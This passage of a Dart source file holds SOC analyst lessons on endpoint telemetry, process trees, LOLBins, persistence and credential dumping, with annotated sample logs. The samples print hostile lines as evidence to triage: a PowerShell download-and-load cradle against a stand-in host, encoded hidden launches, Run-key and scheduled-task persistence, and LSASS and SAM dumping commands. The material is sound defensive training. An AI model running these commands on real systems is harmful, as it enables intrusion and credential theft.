// Endpoint & Malware Triage: a theory module of "The Pulse (SOC Blue Team)". Same
// Lesson/LessonSection/QuizQuestion model as every other module.

import 'lesson_model.dart';

final List<Lesson> socEndpointLessons = [
  Lesson(
    title: "Endpoint Telemetry: What Hosts Tell You",
    estimatedMinutes: 15,
    difficulty: LessonDifficulty.beginner,
    sections: [
      LessonSection(
        heading: "Why the Endpoint Matters",
        body:
            "Most intrusions end up on a computer. A phishing attachment "
            "opens on a laptop, a stolen password is used to log in to a "
            "server, ransomware encrypts files on a file share. Network "
            "logs show that something talked to something else, but the "
            "endpoint shows what actually ran, who ran it, what it touched "
            "and what it started next. When an alert fires, the endpoint is"
            " usually where you find out whether it is real.\n"
            "\n"
            "The challenge for a junior analyst is volume and vocabulary. A"
            " single workstation can produce thousands of events an hour, "
            "and most of them are normal. This lesson gives you a map of "
            "the main telemetry sources, what each one is good at, and what"
            " each one cannot tell you, so that you know where to look and "
            "how much to trust what you find.",
      ),
      LessonSection(
        heading: "Windows Event Logs: The Built-In Source",
        body:
            "Every Windows machine keeps event logs, viewable in Event "
            "Viewer or forwarded to a SIEM. Three channels matter most for "
            "security work: Security, System and Application. There are "
            "also many specialized channels under Applications and Services"
            " Logs, including PowerShell, Task Scheduler and Windows "
            "Defender.\n"
            "\n"
            "The Security log is the richest, but only for what the audit "
            "policy turns on. A common surprise for new analysts is that an"
            " event they expected simply does not exist, because the "
            "setting that creates it was never enabled. The most important "
            "example is process creation: event 4688 records a new process,"
            " but the command line is included only if the policy for "
            "including command line in process creation events is enabled. "
            "Without it, you see that powershell.exe ran but not what it "
            "was told to do.",
        bullets: [
          "4624 and 4625: successful and failed logon. The logon type "
          "field tells you how: 2 interactive, 3 network, 4 batch, 5 "
          "service, 7 unlock, 10 remote interactive (RDP), 11 cached "
          "interactive.",
          "4634 and 4647: logoff events. Useful for estimating how long a"
          " session lasted.",
          "4672: special privileges assigned to a new logon, which "
          "usually means an administrator-level session.",
          "4688: a process was created (command line only if enabled). "
          "4689 records process exit.",
          "4698, 4702: scheduled task created or updated. 4697 (Security)"
          " and 7045 (System): a service was installed.",
          "4720, 4722, 4732: user account created, enabled, or added to a"
          " local security group.",
          "1102 (Security) and 104 (System): the audit log or an event "
          "log was cleared. Almost never legitimate on a production "
          "machine without a change ticket.",
          "4768, 4769, 4776: Kerberos ticket requests and NTLM credential"
          " validation, mostly seen on domain controllers.",
        ],
      ),
      LessonSection(
        heading: "Sysmon: Better Process and Network Detail",
        body:
            "Sysmon (System Monitor) is a free Microsoft Sysinternals tool "
            "that installs as a service and driver and writes rich events "
            "to its own log, Microsoft-Windows-Sysmon/Operational. What it "
            "records depends on a configuration file, so two Sysmon "
            "deployments can look very different. Community configurations "
            "exist as a starting point; check current availability and tune"
            " them to your environment.\n"
            "\n"
            "Sysmon fills the gaps in the default Windows logs. Its process"
            " creation event includes the full command line, the parent "
            "process, the parent command line, file hashes and the user, "
            "all in one record. It also adds network connections attributed"
            " to a process, which the Security log does not do well.",
        bullets: [
          "Event ID 1: process creation, with hashes, parent image and "
          "command line.",
          "Event ID 3: network connection, with source and destination "
          "address and the process that made it.",
          "Event ID 7: image (DLL) loaded. Very noisy, so usually "
          "filtered tightly.",
          "Event ID 8: CreateRemoteThread, a common sign of process "
          "injection.",
          "Event ID 10: process access, which is how credential dumping "
          "against LSASS shows up.",
          "Event ID 11: file created. Event ID 23: file deleted.",
          "Event IDs 12, 13, 14: registry key and value creation, "
          "modification and rename. These expose persistence in Run keys "
          "and services.",
          "Event ID 22: DNS query, attributed to the process that asked.",
        ],
      ),
      LessonSection(
        heading: "EDR: Telemetry Plus Response",
        body:
            "Endpoint detection and response (EDR) tools combine a sensor "
            "on the host with a cloud or on-premises console. The sensor "
            "collects process, file, registry, network and module activity,"
            " often more completely than Sysmon, and the console adds "
            "detection logic, a searchable history, a visual process tree "
            "and response actions such as isolating a host or killing a "
            "process.\n"
            "\n"
            "For an analyst the practical differences from raw logs are "
            "these: the data is already joined (process, parent, user, "
            "device and network in one view), detections arrive with a "
            "severity and a mapped technique, and you can act directly. The"
            " cost is that you depend on what the product chooses to record"
            " and for how long. Know your tool's retention period and its "
            "blind spots before you rely on a negative result.\n"
            "\n"
            "Other free and open-source tools also help: osquery lets you "
            "ask a machine questions in SQL form, and Velociraptor collects"
            " artifacts at scale during investigations. Check current "
            "availability and documentation before building a workflow "
            "around them.",
      ),
      LessonSection(
        heading: "Annotated Sysmon Event ID 1",
        isTemplate: true,
        body:
            "EventID:       1 (Process Create)\n"
            "UtcTime:       2026-10-06 09:14:52.318\n"
            "Host:          WKS-FIN-014.corp.example\n"
            "User:          CORP\\mrao\n"
            "Image:         "
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
            "CommandLine:   powershell.exe -NoProfile -WindowStyle Hidden "
            "-EncodedCommand SQBFAFgA...\n"
            "ParentImage:   C:\\Program Files\\Microsoft "
            "Office\\root\\Office16\\WINWORD.EXE\n"
            "ParentCmdLine: \"WINWORD.EXE\" "
            "\"C:\\Users\\mrao\\Downloads\\invoice_4471.docm\"\n"
            "IntegrityLevel: Medium\n"
            "Hashes:        SHA256=<hash of powershell.exe>\n"
            "\n"
            "--- ANALYST NOTES ---\n"
            "1. Read the fields in this order: image, parent, command line,"
            " user, hashes.\n"
            "2. Image: powershell.exe is a legitimate Microsoft binary. The"
            " file is not the problem; the context is.\n"
            "3. Parent: Word launching PowerShell is rare in normal work. "
            "This is the strongest signal on the page.\n"
            "4. Command line: hidden window plus an encoded command means "
            "someone wanted to avoid being seen or read.\n"
            "5. File: a macro-enabled document (.docm) in Downloads, likely"
            " from email or the web.\n"
            "6. Time: check 09:14:52Z against the alert time and the user's"
            " working hours.\n"
            "7. Next: decode the command, check the email source, look for "
            "outbound connections (Event ID 3, 22) from this process within"
            " the next minute.\n"
            "8. ATT&CK: T1204.002 (User Execution: Malicious File, "
            "Execution) and T1059.001 (PowerShell, Execution).",
      ),
      LessonSection(
        heading: "Telemetry Limits: What You Cannot Assume",
        body:
            "Logs are evidence, not truth. Several limits are worth keeping"
            " in mind so that you do not overstate a conclusion.",
        bullets: [
          "Absence of an event is not absence of activity. The audit "
          "policy, the Sysmon configuration, the EDR sensor health and "
          "the log retention all decide what was captured.",
          "Clocks differ. Convert everything to UTC and check whether the"
          " host's time was accurate before building a timeline from "
          "several sources.",
          "Attackers clear logs. Event 1102 or 104, a stopped Sysmon "
          "service, or a sudden gap in events from one host is itself an "
          "alert.",
          "Forwarding delays. A SIEM may receive events minutes later "
          "than they happened, and some hosts forward only on a schedule.",
          "Names lie, hashes do not. A file can be called anything. "
          "Process name, path, signer and hash together are far stronger "
          "than the name alone.",
          "Sensors can be tampered with. If telemetry from a host stops "
          "right after suspicious activity, treat the silence as "
          "suspicious.",
        ],
      ),
      LessonSection(
        heading: "What to Check First on Any Endpoint Alert",
        body:
            "When an endpoint alert lands in your queue and you are not "
            "sure where to start, work through a short list before diving "
            "into detail. It keeps you from chasing the wrong thing.",
        bullets: [
          "Which host and which user? Is this a server, a laptop, a "
          "domain controller? Who owns it and how important is it?",
          "Which process and what command line? Capture the exact text "
          "before it scrolls out of view.",
          "What was the parent? The parent often explains the whole "
          "event.",
          "What time, and what happened just before and after? Open a "
          "window of a few minutes either side.",
          "Is the sensor healthy and is logging complete? Check for gaps "
          "before trusting a quiet result.",
          "Has anything similar fired on other hosts? One machine is an "
          "incident; several is a campaign.",
        ],
      ),
      LessonSection(
        heading: "Common Mistakes",
        body:
            "New analysts tend to repeat the same handful of errors with "
            "endpoint data. Knowing them in advance saves time.",
        bullets: [
          "Judging a process by its name alone, and dismissing it because"
          " it is a Microsoft binary.",
          "Ignoring the parent process and reading only the child.",
          "Closing an alert because the file was quarantined, without "
          "checking what ran before the quarantine.",
          "Forgetting time zones and comparing local time in one tool "
          "with UTC in another.",
          "Assuming that no results means nothing happened, when the log "
          "source was never enabled.",
          "Searching only the one host in the alert and never asking "
          "whether other hosts did the same thing.",
        ],
      ),
      LessonSection(
        heading: "Annotated Log Source Gap Check",
        isTemplate: true,
        body:
            "Question: did anything run on SRV-APP-02 between 11:30Z and "
            "11:50Z?\n"
            "\n"
            "Source                      Status\n"
            "Security 4688               present, but CommandLine field "
            "empty\n"
            "Sysmon                      not installed on this server\n"
            "EDR sensor                  installed, last check-in 11:44Z "
            "(gap after)\n"
            "PowerShell 4104             present\n"
            "Proxy / DNS                 present\n"
            "\n"
            "--- ANALYST NOTES ---\n"
            "1. Process names are visible but not their arguments, so any "
            "conclusion about what a process did is partial.\n"
            "2. The EDR gap after 11:44Z overlaps the window. Treat it as a"
            " possible tamper or crash, not as proof of quiet.\n"
            "3. Write the limits into the ticket: 'No command-line data "
            "available; EDR silent from 11:44Z.'\n"
            "4. Raise the audit policy gap as a follow-up so the next "
            "investigation is not blind.",
      ),
    ],
  ),
  Lesson(
    title: "Process Trees and Parent-Child Relationships",
    estimatedMinutes: 14,
    difficulty: LessonDifficulty.beginner,
    sections: [
      LessonSection(
        heading: "Why Process Trees Are the Core Skill",
        body:
            "Every program on a computer is started by another program. The"
            " first process starts others, which start others, forming a "
            "tree. When you view that tree you see the story of what "
            "happened: this document opened that script, which launched "
            "that tool, which connected to that address. Alerts about "
            "single events are weak on their own. The same event inside a "
            "suspicious chain is strong.\n"
            "\n"
            "Experienced analysts often decide quickly whether an alert is "
            "real by looking at the tree for a few seconds. This lesson "
            "teaches you to do the same by learning what normal looks like,"
            " so that abnormal stands out.",
      ),
      LessonSection(
        heading: "Key Terms",
        body:
            "A few words come up constantly in endpoint work.",
        bullets: [
          "Process: a running instance of a program, with a process ID "
          "(PID).",
          "Parent and child: the parent process creates the child. The "
          "child records the parent's PID, which is how trees are "
          "rebuilt.",
          "Image: the executable file on disk that the process was "
          "started from.",
          "Command line: the full text used to start the process, "
          "including arguments and switches.",
          "Session and integrity level: where the process runs (user "
          "session or system) and how much privilege it has.",
          "Spawning: informal term for a parent creating a child, as in "
          "'Word spawned PowerShell'.",
          "Orphan: a process whose parent has exited. Common and often "
          "harmless, but it can hide the real origin, so look at logs "
          "from earlier.",
        ],
      ),
      LessonSection(
        heading: "A Normal Windows Process Tree",
        body:
            "To spot the odd one, learn the usual shape. On a Windows "
            "machine the startup sequence is consistent, and many attacks "
            "imitate system process names, so knowing the genuine "
            "relationships is protective.",
        bullets: [
          "System and smss.exe start first, then csrss.exe and "
          "wininit.exe, then services.exe, lsass.exe and the others.",
          "services.exe is the parent of most service processes and of "
          "many svchost.exe instances. svchost.exe should normally have "
          "services.exe as its parent and usually carries a -k group "
          "argument.",
          "winlogon.exe starts the user session, which launches "
          "userinit.exe and then explorer.exe. Explorer is the normal "
          "parent of programs a user opens by double-clicking.",
          "lsass.exe should have a single instance, run from "
          "C:\\Windows\\System32, and have wininit.exe as its parent.",
          "Office applications (WINWORD.EXE, EXCEL.EXE, OUTLOOK.EXE) "
          "normally do not start cmd.exe, powershell.exe, wscript.exe, "
          "mshta.exe or rundll32.exe.",
          "Browsers start their own helper processes and the occasional "
          "installer or downloaded file. They do not usually start script"
          " interpreters directly.",
        ],
      ),
      LessonSection(
        heading: "Annotated Tree: A Phishing Chain",
        isTemplate: true,
        body:
            "OUTLOOK.EXE (PID 4120)  user: CORP\\mrao\n"
            "  +-- WINWORD.EXE (PID 5532)  opened invoice_4471.docm\n"
            "        +-- cmd.exe (PID 6084)  /c powershell -w hidden -enc "
            "SQBF...\n"
            "              +-- powershell.exe (PID 6120)\n"
            "                    +-- Network: 203.0.113.45:443  (Sysmon ID "
            "3)\n"
            "                    +-- File written: "
            "C:\\Users\\mrao\\AppData\\Roaming\\update.dll (Sysmon ID 11)\n"
            "                    +-- rundll32.exe (PID 6340)  "
            "update.dll,Start\n"
            "\n"
            "--- ANALYST NOTES ---\n"
            "1. Outlook to Word is plausible: the user opened an "
            "attachment.\n"
            "2. Word to cmd.exe is the first red flag. Document apps rarely"
            " need a command shell.\n"
            "3. The hidden, encoded PowerShell is the second flag and hides"
            " the real instruction.\n"
            "4. The outbound connection and the new DLL in AppData show a "
            "download-and-run stage (T1105 Ingress Tool Transfer, Command "
            "and Control).\n"
            "5. rundll32.exe loading a DLL from a user-writable folder is a"
            " classic proxy execution pattern (T1218.011, Defense Evasion).\n"
            "6. Verdict reasoning: no single item proves malice, but the "
            "chain from email to document to hidden shell to download to "
            "DLL execution is a textbook pattern. Escalate, and begin "
            "containment steps.",
      ),
      LessonSection(
        heading: "Suspicious Parent-Child Pairs",
        body:
            "Learn a short list of pairs that should make you look closer. "
            "None is proof alone, and every one has some legitimate use "
            "somewhere, so always check the command line and user.",
        bullets: [
          "Office application to a shell or script engine (cmd, "
          "powershell, wscript, cscript, mshta): macro or exploit "
          "execution. T1204.002 and T1059, Execution.",
          "Browser or PDF reader to a shell: possible drive-by download "
          "or malicious document.",
          "w3wp.exe (IIS web server) or a database service to cmd.exe or "
          "powershell.exe: possible web shell or injection against a "
          "server. T1505.003 (Server Software Component: Web Shell, "
          "Persistence).",
          "WmiPrvSE.exe to a shell: remote command execution using WMI. "
          "T1047, Execution.",
          "services.exe to an unfamiliar executable in a temp or user "
          "folder: a newly installed service used for remote execution. "
          "T1569.002 (Service Execution).",
          "svchost.exe with the wrong parent, or a process named like a "
          "system file but run from the wrong folder: masquerading. "
          "T1036.005 (Match Legitimate Name or Location, Defense "
          "Evasion).",
          "Explorer.exe to a script interpreter with a long command line:"
          " a user double-clicked something. Check the file path.",
          "A scheduled task host (taskeng or taskhostw, or svchost "
          "running Schedule) to a shell: persistence firing. Check when "
          "the task was created.",
        ],
      ),
      LessonSection(
        heading: "Reading Beyond Names: Path, Signer, Hash",
        body:
            "A process name is the easiest thing to fake. Whenever a "
            "process matters, check these, in order of how hard they are "
            "for an attacker to forge.",
        bullets: [
          "Path: system files live in System32 or SysWOW64. The same name"
          " in a user folder, ProgramData, Temp or Public is a strong "
          "flag.",
          "Digital signature: is it signed, by whom, and is the signature"
          " valid? Signed does not mean safe, but unsigned code in an odd"
          " place deserves attention.",
          "Hash: look up the SHA256 in reputation sources and your own "
          "prior cases. A known-good hash from the vendor is strong; a "
          "hash first seen in your environment today is interesting.",
          "Prevalence: how many machines in the company run this file? A "
          "unique file on one laptop is more suspicious than one found on"
          " all of them.",
          "Compile or creation time: a file created minutes before it "
          "ran, in a user-writable path, matches a freshly downloaded "
          "payload.",
        ],
      ),
      LessonSection(
        heading: "Lookalike Names and Tricks",
        body:
            "Attackers choose names that fall between 'obviously wrong' and"
            " 'looks fine at a glance'.",
        bullets: [
          "Misspellings and swaps: scvhost.exe, svch0st.exe, lsasss.exe, "
          "explore.exe.",
          "Right name, wrong place: svchost.exe running from "
          "C:\\Users\\Public.",
          "Trailing spaces or double extensions: invoice.pdf.exe, where "
          "the real extension is hidden by Explorer defaults.",
          "Renamed legitimate tools: a copy of a built-in utility saved "
          "under another name. The original file name in the PE metadata,"
          " shown by many EDR tools, may still reveal it.",
          "Process hollowing and injection (T1055, Defense Evasion and "
          "Privilege Escalation): the process looks legitimate, but its "
          "memory has been replaced. Clues are unusual network activity "
          "from a quiet process, or Sysmon event 8 and 10 pointing to it.",
        ],
      ),
      LessonSection(
        heading: "Annotated Check: Is This svchost Real?",
        isTemplate: true,
        body:
            "ALERT: svchost.exe making outbound connections to "
            "198.51.100.77:8443\n"
            "\n"
            "Check 1  Path:        C:\\Users\\Public\\svchost.exe   -> WRONG "
            "(expected C:\\Windows\\System32)\n"
            "Check 2  Parent:      explorer.exe                 -> WRONG "
            "(expected services.exe)\n"
            "Check 3  Arguments:   none                         -> WRONG "
            "(real instances usually carry -k <group>)\n"
            "Check 4  Signature:   unsigned                     -> WRONG "
            "(Microsoft-signed)\n"
            "Check 5  Prevalence:  1 host in the company        -> UNUSUAL\n"
            "Check 6  Network:     beaconing every 60 seconds   -> "
            "consistent with C2\n"
            "\n"
            "--- ANALYST NOTES ---\n"
            "Five independent checks fail. The name is a disguise. "
            "T1036.005 plus likely T1071 (Application Layer Protocol, "
            "Command and Control).\n"
            "Action: isolate the host if policy allows, preserve the file "
            "and memory, and search for the same hash and destination "
            "across all hosts.",
      ),
      LessonSection(
        heading: "What to Check First",
        body:
            "Before you form a view on a tree, run through these checks. "
            "They take a minute and prevent most misreads.",
        bullets: [
          "Read the tree from the top down, then from the suspicious leaf"
          " upward, and note the first process that does not belong.",
          "Compare the user with the process. A finance user running a "
          "database tool or a compiler, or a service account with an "
          "interactive session, is out of pattern.",
          "Read each command line in full, including the working "
          "directory and any file paths it names.",
          "Check the time gaps. A shell launched one second after a "
          "document opened is automatic; one launched an hour later may "
          "be a person.",
          "Look downward: list everything the suspicious process created,"
          " including files, registry keys, network connections and "
          "further children.",
          "Ask whether the same tree shape has occurred on another host "
          "in the last week.",
        ],
      ),
      LessonSection(
        heading: "Common Mistakes",
        body:
            "Process tree work goes wrong in predictable ways.",
        bullets: [
          "Treating every Office-to-shell event as malware without "
          "checking the command line. Some legitimate add-ins and macros "
          "do this, so confirm with the file, user and baseline.",
          "Looking only at the leaf process and missing the grandparent "
          "where the story begins.",
          "Trusting a screenshot of a tree instead of the underlying "
          "events with timestamps.",
          "Stopping at the first suspicious process and not checking what"
          " it started afterward.",
          "Forgetting that a tree can be broken: if the parent has "
          "already exited, you may need earlier logs to find the origin.",
        ],
      ),
    ],
  ),
  Lesson(
    title: "PowerShell, LOLBins and Persistence",
    estimatedMinutes: 16,
    difficulty: LessonDifficulty.intermediate,
    sections: [
      LessonSection(
        heading: "Living Off the Land",
        body:
            "Attackers prefer to use what is already on the machine. "
            "Built-in tools are trusted by the operating system, signed by "
            "Microsoft and present everywhere, so they raise fewer alarms "
            "than custom malware. Programs abused this way are called "
            "LOLBins (living off the land binaries), and the broader idea "
            "is called living off the land. The public LOLBAS project "
            "catalogs many of them and how they can be misused; check it "
            "for current entries.\n"
            "\n"
            "For you this means that a legitimate binary running is never "
            "the end of the question. You judge the command line, the "
            "parent, the user and the destination. The same tool that an "
            "administrator uses every day becomes suspicious in the wrong "
            "context.",
      ),
      LessonSection(
        heading: "PowerShell: Powerful and Heavily Abused",
        body:
            "PowerShell is a scripting shell with deep access to Windows. "
            "Administrators rely on it, and so do attackers (T1059.001, "
            "Execution). Because it can download, decode and run code in "
            "memory, a script may leave little on disk. The good news is "
            "that PowerShell can also be logged well, and logs are your "
            "main evidence.",
        bullets: [
          "Script block logging (event 4104 in the "
          "Microsoft-Windows-PowerShell/Operational log) records the code"
          " that actually ran, often after de-obfuscation. It is the "
          "single most useful PowerShell log.",
          "Module logging (event 4103) records pipeline execution "
          "details.",
          "Process creation logs (4688 with command line, Sysmon 1) show "
          "how PowerShell was launched.",
          "Transcription, if enabled, writes session text to files.",
        ],
      ),
      LessonSection(
        heading: "Command Line Patterns to Notice",
        body:
            "These patterns do not prove an attack, but each justifies a "
            "closer look, especially in combination.",
        bullets: [
          "-EncodedCommand or -enc followed by a long Base64 string: "
          "hides the code. T1027 (Obfuscated Files or Information, "
          "Defense Evasion).",
          "-WindowStyle Hidden, -NoProfile, -NonInteractive, "
          "-ExecutionPolicy Bypass: used together they suggest a script "
          "intended to run unseen.",
          "Download cradles: Invoke-WebRequest, Net.WebClient, "
          "DownloadString, DownloadFile, and Invoke-Expression or IEX "
          "running what was downloaded. T1105 and T1059.001.",
          "Reflection and in-memory loading: Assembly.Load, VirtualAlloc "
          "style calls in script, or reading bytes and executing them.",
          "AMSI and logging tampering: text that tries to disable the "
          "Antimalware Scan Interface or script logging. T1562.001 "
          "(Impair Defenses, Defense Evasion).",
          "A long, strangely cased or heavily escaped string, many tick "
          "or caret characters, or string concatenation: signs of "
          "obfuscation (also T1027).",
          "PowerShell started by something that is not a person: Office, "
          "a web server, a scheduled task, WMI.",
        ],
      ),
      LessonSection(
        heading: "Annotated Script Block Log",
        isTemplate: true,
        body:
            "Log:       Microsoft-Windows-PowerShell/Operational\n"
            "EventID:   4104 (Script Block Logging)\n"
            "Host:      WKS-FIN-014\n"
            "Time:      2026-10-06 09:14:54Z\n"
            "\n"
            "ScriptBlockText:\n"
            "  \$u = 'https://cdn-files.example/a/p.bin'\n"
            "  \$b = (New-Object Net.WebClient).DownloadData(\$u)\n"
            "  [System.Reflection.Assembly]::Load(\$b) | Out-Null\n"
            "  [Loader.Main]::Run()\n"
            "\n"
            "--- ANALYST NOTES ---\n"
            "1. Source: the earlier encoded command was decoded by "
            "PowerShell itself, so the readable code is here.\n"
            "2. Behavior: it downloads bytes from a web host and loads them"
            " as a .NET assembly in memory. Nothing is written to disk, so "
            "file-based antivirus may never see it.\n"
            "3. Indicators to record: the URL, the host cdn-files.example, "
            "the method name Loader.Main.\n"
            "4. Next: check proxy and DNS logs for cdn-files.example from "
            "every host; find what else the process did after the load; "
            "capture memory if the host is isolated.\n"
            "5. ATT&CK: T1059.001, T1105 (Command and Control), T1620 "
            "(Reflective Code Loading, Defense Evasion).",
      ),
      LessonSection(
        heading: "Common LOLBins and What Misuse Looks Like",
        body:
            "You do not need to memorize hundreds. Start with the ones that"
            " appear again and again.",
        bullets: [
          "rundll32.exe and regsvr32.exe: run DLLs or scripts, sometimes "
          "from remote locations. T1218.011 and T1218.010 (System Binary "
          "Proxy Execution, Defense Evasion). Suspect a DLL in a user "
          "folder, or regsvr32 given a URL.",
          "mshta.exe: runs HTML applications and script. T1218.005. "
          "Suspect a remote URL argument.",
          "wscript.exe and cscript.exe: run VBScript and JScript files, "
          "often from email attachments or Downloads. T1059.005 (Visual "
          "Basic) and T1059.007 (JavaScript).",
          "certutil.exe: a certificate tool that can also download and "
          "decode files. Suspect -urlcache or -decode in a command line. "
          "T1105 and T1140.",
          "bitsadmin.exe: manages BITS transfers, which can download and "
          "persist. T1197 (BITS Jobs).",
          "wmic.exe and WMI: remote or local execution and queries. "
          "T1047.",
          "msiexec.exe: installs packages, including from remote "
          "locations, and can run malicious installers silently.",
          "schtasks.exe, sc.exe, reg.exe: create tasks, services and "
          "registry persistence from the command line.",
          "Compression and transfer tools: tar.exe, curl.exe and similar "
          "are present on modern Windows and are used for staging and "
          "download.",
        ],
      ),
      LessonSection(
        heading: "Persistence: How Malware Survives a Reboot",
        body:
            "Once attackers gain access they want to keep it. Persistence "
            "mechanisms store something on the machine that restarts their "
            "code later. When you confirm a compromise, finding all "
            "persistence is as important as finding the first payload, "
            "because missing one lets them return.",
        bullets: [
          "Run and RunOnce registry keys: HKCU or HKLM "
          "Software\\Microsoft\\Windows\\CurrentVersion\\Run. T1547.001 (Boot"
          " or Logon Autostart Execution, Persistence). Sysmon events 12 "
          "and 13 catch changes.",
          "Startup folder: files placed in the user or all-users Startup "
          "directory. Same technique ID as above.",
          "Scheduled tasks: created with schtasks or the Task Scheduler "
          "API. T1053.005 (Persistence, Execution, Privilege Escalation)."
          " Look at events 4698 and the task's action and trigger.",
          "Services: a new service pointing to an executable. T1543.003 "
          "(Create or Modify System Process: Windows Service, "
          "Persistence). Events 7045 and 4697.",
          "WMI event subscriptions: a filter, a consumer and a binding "
          "that run code on a trigger. T1546.003. Hard to see without "
          "WMI-specific logging.",
          "DLL search order hijacking and side-loading: a malicious DLL "
          "placed where a trusted program will load it. T1574.001 and "
          "T1574.002 (Hijack Execution Flow).",
          "Accounts and keys: a new local or domain account, or an added "
          "SSH key. T1136 (Create Account, Persistence).",
          "Browser extensions and Office add-ins: a lower-profile "
          "persistence site that is easy to forget.",
        ],
      ),
      LessonSection(
        heading: "Annotated Persistence Hunt",
        isTemplate: true,
        body:
            "Host WKS-FIN-014, after the phishing chain. Findings in order:\n"
            "\n"
            "[1] Registry (Sysmon 13)  09:16:10Z\n"
            "    Key:   "
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdater\n"
            "    Value: rundll32.exe "
            "C:\\Users\\mrao\\AppData\\Roaming\\update.dll,Start\n"
            "\n"
            "[2] Scheduled task (4698)  09:16:41Z\n"
            "    Name:    \\Microsoft\\Windows\\Maintenance\\SyncCheck\n"
            "    Action:  powershell.exe -w hidden -f "
            "C:\\ProgramData\\sync.ps1\n"
            "    Trigger: every 30 minutes\n"
            "\n"
            "[3] Service (7045)  not found.\n"
            "\n"
            "--- ANALYST NOTES ---\n"
            "1. Two persistence methods within two minutes of the first "
            "execution: a Run key (T1547.001) and a scheduled task "
            "(T1053.005).\n"
            "2. Both names imitate legitimate software (OneDrive, Microsoft"
            " Maintenance). Naming proves nothing; the action and path "
            "matter.\n"
            "3. The task points to a script in ProgramData, a writable "
            "location outside user profiles.\n"
            "4. Removal is part of eradication, but only after evidence is "
            "preserved. Record keys, task XML and the file hashes first.\n"
            "5. Hunt: search every host for the same key name, task name, "
            "and the hash of sync.ps1.",
      ),
      LessonSection(
        heading: "What to Check First",
        body:
            "For any suspicious script or LOLBin alert, ask these questions"
            " in this order.",
        bullets: [
          "What is the full command line, and can you decode every layer "
          "of it?",
          "What is the parent, and is that parent a person, a service, or"
          " an application that should not start shells?",
          "What did it connect to? Pull DNS and network events within a "
          "minute of the start.",
          "What did it write or change? Look for files, registry keys, "
          "tasks and services created afterward.",
          "Who was logged on, and does the user normally do this? A "
          "developer running PowerShell is different from a receptionist.",
          "Does the same command line, hash or destination appear on any "
          "other host?",
        ],
      ),
      LessonSection(
        heading: "Reading Encoded Commands Safely",
        body:
            "PowerShell's -EncodedCommand switch takes Base64 text of the "
            "script encoded as UTF-16 little-endian, which is why decoded "
            "output looks wrong in tools that assume plain ASCII. In "
            "CyberChef, use a From Base64 step followed by a Decode text "
            "step set to UTF-16LE. Often the first layer reveals another "
            "encoded or compressed layer, so repeat until you can read the "
            "logic. Do this on text only: you are reading, not running. If "
            "script block logging was on, event 4104 usually saves you the "
            "work by showing the decoded code already.\n"
            "\n"
            "Once readable, extract indicators (URLs, IP addresses, file "
            "paths, mutex or key names), note what the code tries to do, "
            "and map each behavior to a technique only if you actually saw "
            "it.",
      ),
      LessonSection(
        heading: "Common Mistakes",
        body:
            "Several errors are easy to make with this class of alert.",
        bullets: [
          "Dismissing PowerShell because 'the admins use it'. Ask which "
          "admin, from which host, with which ticket.",
          "Blocking a destination and moving on without finding how the "
          "process was started.",
          "Decoding the first layer of Base64 and stopping, when the "
          "result is another encoded stage.",
          "Cleaning up the persistence you found without searching for "
          "more. Attackers usually install more than one.",
          "Executing or pasting unknown script content into your own "
          "working machine to see what happens. Decode in a safe tool "
          "such as CyberChef or an isolated analysis VM.",
        ],
      ),
    ],
  ),
  Lesson(
    title: "Credential Access and Ransomware Precursors",
    estimatedMinutes: 16,
    difficulty: LessonDifficulty.intermediate,
    sections: [
      LessonSection(
        heading: "Why Credentials Are the Prize",
        body:
            "Malware on one laptop is a problem. An attacker holding "
            "administrator credentials is a company-wide problem. With "
            "valid accounts the attacker can log in as a normal user, move "
            "across the network and reach servers, backups and domain "
            "controllers, often without triggering malware alerts at all. "
            "For this reason, credential theft is a pivot point in most "
            "serious intrusions, and spotting it early can stop an incident"
            " before it reaches ransomware.\n"
            "\n"
            "Credential access techniques fall under a single ATT&CK "
            "tactic, Credential Access, but they look very different on a "
            "host. This lesson covers the endpoint signs and the way they "
            "chain into the activity that precedes ransomware.",
      ),
      LessonSection(
        heading: "Where Credentials Live on a Windows Machine",
        body:
            "Knowing where secrets are stored tells you what an attacker "
            "will target.",
        bullets: [
          "LSASS memory: the Local Security Authority Subsystem Service "
          "(lsass.exe) holds logon material in memory for signed-in "
          "users. Dumping it is the best-known technique. T1003.001 (OS "
          "Credential Dumping: LSASS Memory).",
          "The SAM database and registry hives: local account password "
          "hashes. T1003.002 (Security Account Manager). Reading them "
          "involves saving the SAM and SYSTEM hives, for example with reg"
          " save.",
          "NTDS.dit on domain controllers: the domain's account database."
          " T1003.003 (NTDS). Often reached through volume shadow copies "
          "or ntdsutil.",
          "Browser and application stores: saved passwords and cookies. "
          "T1555.003 (Credentials from Web Browsers).",
          "Files and scripts: passwords in configuration files, scripts "
          "and shares. T1552.001 (Credentials In Files).",
          "The network: Kerberos tickets can be requested and cracked "
          "offline (Kerberoasting, T1558.003), and password guessing "
          "creates failed logons (T1110, Brute Force).",
        ],
      ),
      LessonSection(
        heading: "Endpoint Signs of Credential Dumping",
        body:
            "No single sign is definitive, so look for several together.",
        bullets: [
          "Sysmon event 10 (process access) targeting lsass.exe from an "
          "unexpected process, with high-privilege access masks. Many "
          "security products legitimately touch LSASS, so build a "
          "baseline for yours.",
          "Sysmon event 11 or EDR file events creating .dmp files in "
          "Temp, ProgramData or user folders, or a process like "
          "procdump.exe or comsvcs.dll being used with a MiniDump "
          "argument.",
          "A command line such as rundll32.exe comsvcs.dll, MiniDump "
          "followed by a process ID.",
          "reg.exe save of HKLM\\SAM or HKLM\\SYSTEM, or access to shadow "
          "copy paths.",
          "Security events for credentials in use: 4624 type 9 (new "
          "credentials) or unusual type 3 and 10 logons shortly after the"
          " dump, from a different host.",
          "EDR detections for credential theft behavior, including "
          "attempts to disable protections such as LSA protection or "
          "credential guard settings.",
          "Tools renamed to look innocent. The behavior, not the file "
          "name, is the evidence.",
        ],
      ),
      LessonSection(
        heading: "Annotated LSASS Access Alert",
        isTemplate: true,
        body:
            "Alert:     Suspicious access to LSASS\n"
            "Host:      SRV-APP-02.corp.example\n"
            "Time:      2026-10-06 11:42:07Z\n"
            "\n"
            "SourceImage:      C:\\Windows\\Temp\\svc_helper.exe\n"
            "TargetImage:      C:\\Windows\\System32\\lsass.exe\n"
            "GrantedAccess:    0x1FFFFF\n"
            "SourceParent:     cmd.exe (parent: w3wp.exe)\n"
            "User:             NT AUTHORITY\\SYSTEM\n"
            "Follow-on file:   C:\\Windows\\Temp\\d.dmp  (212 MB, created "
            "11:42:09Z)\n"
            "\n"
